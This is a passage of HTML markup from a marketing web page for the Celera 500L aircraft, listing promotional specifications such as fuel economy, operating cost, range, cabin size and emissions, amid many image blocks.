          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500410453-YIEANJ86RXXKMPU0AWOS/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500410453-YIEANJ86RXXKMPU0AWOS/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5.png" data-load="false" data-image-id="5f37ebfa7b61860287b3fe0d" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500410453-YIEANJ86RXXKMPU0AWOS/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_11270"><div><h3>18‚Äì25 mpg fuel economy </h3><p>(a comparable jet aircraft gets 2 ‚Äì 3 mpg)</p></div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_33602"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500429673-1MYWJXIQ0NXEO0R3NESO/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500429673-1MYWJXIQ0NXEO0R3NESO/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy.png" data-load="false" data-image-id="5f37ec0d6e8d155f9ee594d2" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500429673-1MYWJXIQ0NXEO0R3NESO/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_16138"><div><h3>$328 hourly operating costs</h3><p>(a comparable jet aircraft costs $2,100 per hour)</p></div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_35120"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500450140-T0U4DO8CID1Q69T6OYXC/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+2.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500450140-T0U4DO8CID1Q69T6OYXC/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+2.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 2.png" data-load="false" data-image-id="5f37ec222aad3222fbf28b6c" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500450140-T0U4DO8CID1Q69T6OYXC/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+2.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_10675"><p><h3>Max cruise speed projected to be in excess of 460 mph</h3></p></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_36650"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500484870-35OK5KGMK3KCS0LT239J/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+3.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500484870-35OK5KGMK3KCS0LT239J/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+3.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 3.png" data-load="false" data-image-id="5f37ec44d6890509948ae204" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500484870-35OK5KGMK3KCS0LT239J/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+3.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_20579"><p><h3>4,500 nautical mile range</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_38203"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500509446-TY0YCW3Z0515ATZKUZRX/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+4.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500509446-TY0YCW3Z0515ATZKUZRX/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+4.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 4.png" data-load="false" data-image-id="5f37ec5d3466a3251475b77c" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500509446-TY0YCW3Z0515ATZKUZRX/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+4.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_21402"><p><h3>Payload ‚Äì 6 adult passengers</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_39760"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500535394-RXNTN4VX24VMCKPO55JT/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+5.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500535394-RXNTN4VX24VMCKPO55JT/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+5.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 5.png" data-load="false" data-image-id="5f37ec777b61860287b408d3" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500535394-RXNTN4VX24VMCKPO55JT/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+5.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_22907"><p><h3>Comfort ‚Äì 6‚Äô2‚Äù cabin height with 6 first-class seats</h3></p></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597512042385_58579"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597512859185-7NH3LJNQNF3AEUUJC5S9/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+6.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597512859185-7NH3LJNQNF3AEUUJC5S9/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+6.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 6.png" data-load="false" data-image-id="5f381c9bcff70e7afc9833ff" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597512859185-7NH3LJNQNF3AEUUJC5S9/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+6.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597512042385_53128"><p><h3>The Celera 500L‚Äôs reduction in carbon emissions beats FAA and ICAO target emissions standards for aircraft entering service in or after 2031 by over 30%</h3></p></div></div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-38" data-collection-id="5f416f9fa662a5713434fd52" data-parallax-id="5f416f9fa662a5713434fd52" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598544069818" id="page-5f416f9fa662a5713434fd52"><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1598123935995_103278"><div><h2>CABIN COMFORT</h2><p>Superior comfort is delivered through a spacious cabin with a 6‚Äô2‚Äù height, plus six first-class equivalent seats that come in a customizable configuration.</p></div></div></div></div><div><div><div data-aspect-ratio="57.55725190839694" data-block-type="5" id="block-0186cef93f2eb6ff6949"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598125077253-WKFTFU9IXA0P6FV2C7NC/ke17ZwdGBToddI8pDm48kDP0I2FGcIvszmigOvvSKQVZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwH7_TJpxliBUPJg-yA3YbUf3xtZbYxpnBewiaDHhImEkbX9wBIXzx9Bd5CHG0Lug0/Artboard+1%402x.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598125077253-WKFTFU9IXA0P6FV2C7NC/ke17ZwdGBToddI8pDm48kDP0I2FGcIvszmigOvvSKQVZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwH7_TJpxliBUPJg-yA3YbUf3xtZbYxpnBewiaDHhImEkbX9wBIXzx9Bd5CHG0Lug0/Artboard+1%402x.png" data-image-dimensions="655x404" data-image-focal-point="0.5,0.5" alt="Artboard 1@2x.png" data-load="false" data-image-id="5f4174153a78755690f98121" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598125077253-WKFTFU9IXA0P6FV2C7NC/ke17ZwdGBToddI8pDm48kDP0I2FGcIvszmigOvvSKQVZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwH7_TJpxliBUPJg-yA3YbUf3xtZbYxpnBewiaDHhImEkbX9wBIXzx9Bd5CHG0Lug0/Artboard+1%402x.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-aspect-ratio="67.03146374829001" data-block-type="5" id="block-yui_3_17_2_1_1598215388769_7308"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598544038919-UGNUJD296S3XBMD20YQU/ke17ZwdGBToddI8pDm48kI0PPfaIelT6SC7kpTD6Cdx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URS0yeOn2t9HRIHq8sCmA0ZOyR34UwcEYwsqCfG35AFg86iGyAHoWEzl9kO54n1N1Q/Celera+500L%2C+LIGHT+INTERIOR+VIEW%2C+illustration.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598544038919-UGNUJD296S3XBMD20YQU/ke17ZwdGBToddI8pDm48kI0PPfaIelT6SC7kpTD6Cdx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URS0yeOn2t9HRIHq8sCmA0ZOyR34UwcEYwsqCfG35AFg86iGyAHoWEzl9kO54n1N1Q/Celera+500L%2C+LIGHT+INTERIOR+VIEW%2C+illustration.jpg" data-image-dimensions="1520x1174" data-image-focal-point="0.5,0.5" alt="Celera 500L, LIGHT INTERIOR VIEW, illustration.jpg" data-load="false" data-image-id="5f47d8a3bec2324127338dbe" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598544038919-UGNUJD296S3XBMD20YQU/ke17ZwdGBToddI8pDm48kI0PPfaIelT6SC7kpTD6Cdx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URS0yeOn2t9HRIHq8sCmA0ZOyR34UwcEYwsqCfG35AFg86iGyAHoWEzl9kO54n1N1Q/Celera+500L%2C+LIGHT+INTERIOR+VIEW%2C+illustration.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-16" data-parallax-original-element="" data-collection-id="5f369f354bea837293b205fd" data-parallax-id="5f369f354bea837293b205fd" data-edit-main-image="Background">
        
        
        
          
            <figure data-parallax-image-wrapper="">
              
  <img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597497459891-JEZ4FUK7QBL4WML4Y9BX/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/IMG_8009+edited.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597497459891-JEZ4FUK7QBL4WML4Y9BX/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/IMG_8009+edited.jpg" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" alt="IMG_8009 edited.jpg" data-load="false" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597497459891-JEZ4FUK7QBL4WML4Y9BX/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/IMG_8009+edited.jpg">

            </figure>
          
        
      </section>

    

  

    

      <section id="new-page-5" data-collection-id="5f35e2dad3b01649fe69b19c" data-parallax-id="5f35e2dad3b01649fe69b19c" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598478811561" id="page-5f35e2dad3b01649fe69b19c"><div><div><div data-block-type="23" id="block-yui_3_17_2_1_1597412812791_56319"><p><h2>
  <center><strong><span> It doesn't just outperform <br>
in every category. it crushes it.</span></strong></center>
</h2></p></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1598297383710_15073"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598478790066-MAHLOYDNP8YNNNFEERO2/ke17ZwdGBToddI8pDm48kFZ_sTh7YZIW3_Zoc3kUgdd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0tuQyATp5Ln32JdtPG7_1NRNe_fGcjHNGLHpZQrTBR4mg-6JhFotYQqsTpLRDwWsMA/Celera+500L%2C+comparable+graphic.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598478790066-MAHLOYDNP8YNNNFEERO2/ke17ZwdGBToddI8pDm48kFZ_sTh7YZIW3_Zoc3kUgdd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0tuQyATp5Ln32JdtPG7_1NRNe_fGcjHNGLHpZQrTBR4mg-6JhFotYQqsTpLRDwWsMA/Celera+500L%2C+comparable+graphic.png" data-image-dimensions="2500x2191" data-image-focal-point="0.5,0.5" alt="Celera 500L, comparable graphic.png" data-load="false" data-image-id="5f46d9c5f084df2a422bea80" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598478790066-MAHLOYDNP8YNNNFEERO2/ke17ZwdGBToddI8pDm48kFZ_sTh7YZIW3_Zoc3kUgdd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0tuQyATp5Ln32JdtPG7_1NRNe_fGcjHNGLHpZQrTBR4mg-6JhFotYQqsTpLRDwWsMA/Celera+500L%2C+comparable+graphic.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_27999"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501568705-SQLPETERAOWBJ9O8BZYG/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/1.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501568705-SQLPETERAOWBJ9O8BZYG/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/1.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="1.png" data-load="false" data-image-id="5f37f0805ff12d0233511046" data-type="image" src="https://www.ottoaviation.com/1.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_29973"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501588773-IY2XZ93O3OO1S3J2AHDR/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/2.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501588773-IY2XZ93O3OO1S3J2AHDR/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/2.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="2.png" data-load="false" data-image-id="5f37f094551f1545775a4837" data-type="image" src="https://www.ottoaviation.com/2.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_21075"><p><h3>Passenger capacity (6) of a Light/Midsize Jet with larger and more comfortable seats</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_32243"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501607852-AZM63XRTI7Z4GYLWQRHC/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/3.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501607852-AZM63XRTI7Z4GYLWQRHC/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/3.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="3.png" data-load="false" data-image-id="5f37f0a73466a325147625a0" data-type="image" src="https://www.ottoaviation.com/3.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_22458"><p><h3>Cabin volume (448 ft¬≥) of a Midsize Jet</h3></p></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_71766"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502062445-INUWWXPKLN83Q9N5JH2G/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/image-asset.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502062445-INUWWXPKLN83Q9N5JH2G/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/image-asset.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="" data-load="false" data-image-id="5f37f26ede22531a4d790dc0" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502062445-INUWWXPKLN83Q9N5JH2G/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/image-asset.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_73478"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
